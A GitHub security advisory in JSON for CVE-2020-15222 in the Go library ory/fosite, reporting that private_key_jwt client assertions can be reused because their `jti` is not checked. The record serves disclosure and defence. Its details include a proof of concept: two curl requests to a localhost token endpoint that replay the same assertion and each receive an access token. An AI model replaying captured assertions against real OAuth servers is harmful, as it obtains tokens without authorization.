{
  "id": "GHSA-v3q9-2p3m-7g43",
  "summary": "Token reuse in github.com/ory/fosite",
  "details": "### Impact\n\nWhen using client authentication method \"private_key_jwt\" [1], OpenId specification says the following about assertion `jti`:\n\n> A unique identifier for the token, which can be used to prevent reuse of the token. These tokens MUST only be used once, unless conditions for reuse were negotiated between the parties\n\nHydra does not seem to check the uniqueness of this `jti` value. Here is me sending the same token request twice, hence with the same `jti` assertion, and getting two access tokens:\n\n```\n$ curl --insecure --location --request POST 'https://localhost/_/oauth2/token' \\\n   --header 'Content-Type: application/x-www-form-urlencoded' \\\n   --data-urlencode 'grant_type=client_credentials' \\\n   --data-urlencode 'client_id=c001d00d-5ecc-beef-ca4e-b00b1e54a111' \\\n   --data-urlencode 'scope=application openid' \\\n   --data-urlencode 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' \\\n   --data-urlencode 'client_assertion=eyJhb [...] jTw'\n{\"access_token\":\"zeG0NoqOtlACl8q5J6A-TIsNegQRRUzqLZaYrQtoBZQ.VR6iUcJQYp3u_j7pwvL7YtPqGhtyQe5OhnBE2KCp5pM\",\"expires_in\":3599,\"scope\":\"application openid\",\"token_type\":\"bearer\"}\u23ce\n$ curl --insecure --location --request POST 'https://localhost/_/oauth2/token' \\\n   --header 'Content-Type: application/x-www-form-urlencoded' \\\n   --data-urlencode 'grant_type=client_credentials' \\\n   --data-urlencode 'client_id=c001d00d-5ecc-beef-ca4e-b00b1e54a111' \\\n   --data-urlencode 'scope=application openid' \\\n   --data-urlencode 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' \\\n   --data-urlencode 'client_assertion=eyJhb [...] jTw'\n{\"access_token\":\"wOYtgCLxLXlELORrwZlmeiqqMQ4kRzV-STU2_Sollas.mwlQGCZWXN7G2IoegUe1P0Vw5iGoKrkOzOaplhMSjm4\",\"expires_in\":3599,\"scope\":\"application openid\",\"token_type\":\"bearer\"}\n```\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\n### Workarounds\n\nDo not allow clients to use `private_key_jwt`.\n\n### References\n\nhttps://openid.net/specs/openid-connect-core-1_0.html#ClientAuthentication",
  "aliases": [
    "CVE-2020-15222"
  ],
  "modified": "2021-11-19T15:24:07Z",
  "published": "2021-05-24T16:57:52Z",
  "database_specific": {
    "github_reviewed": true,
    "cwe_ids": [
      "CWE-287",
      "CWE-345"
    ],
    "severity": "HIGH"
  },
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/ory/fosite/security/advisories/GHSA-v3q9-2p3m-7g43"
    },
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-15222"
    },
    {
      "type": "WEB",
      "url": "https://github.com/ory/fosite/commit/0c9e0f6d654913ad57c507dd9a36631e1858a3e9"
    },
    {
      "type": "WEB",
      "url": "https://github.com/ory/fosite/releases/tag/v0.31.0"
    },
    {
      "type": "WEB",
      "url": "https://openid.net/specs/openid-connect-core-1_0.html#ClientAuthentication"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/ory/fosite"
    }
  ],
  "affected": [
    {
      "package": {
        "name": "github.com/ory/fosite",
        "ecosystem": "Go",
        "purl": "pkg:golang/github.com/ory/fosite"
      },
      "ranges": [
        {
          "type": "SEMVER",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "0.31.0"
            }
          ]
        }
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/05/GHSA-v3q9-2p3m-7g43/GHSA-v3q9-2p3m-7g43.json"
      }
    }
  ],
  "schema_version": "1.2.0",
  "severity": [
    {
      "type": "CVSS_V3",
      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
    }
  ]
}